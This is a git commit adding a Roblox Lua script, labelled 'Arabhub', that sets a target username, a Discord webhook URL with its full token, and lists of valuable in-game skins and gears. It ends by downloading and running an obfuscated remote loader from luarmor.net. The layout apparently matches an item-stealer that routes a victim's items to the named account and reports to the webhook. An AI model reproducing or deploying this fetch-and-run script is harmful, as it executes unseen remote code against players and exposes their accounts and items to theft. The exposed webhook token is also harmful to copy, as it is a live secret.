8dd01b54c2b47ca5d01a4974e7c78b74dc5d6e1d
sab-api <carlosignaa2019@gmail.com>
2026-08-07 06:37:41 -0400

    Add script Arabhub_1786099061667.lua

---
+++ scripts/Arabhub_1786099061667.lua
@@ -0,0 +1,49 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "islam12490"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480602732602855678/wHAQ-9oQOynkvrvda1i_8mZnFHrMSfQYxtNT30ebyY6_o7V_tQmDbH3375cuoTlQmHW1"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Halloween"] = true,
+    ["Gingerbread"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true,
+    ["Candy Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()
+end)
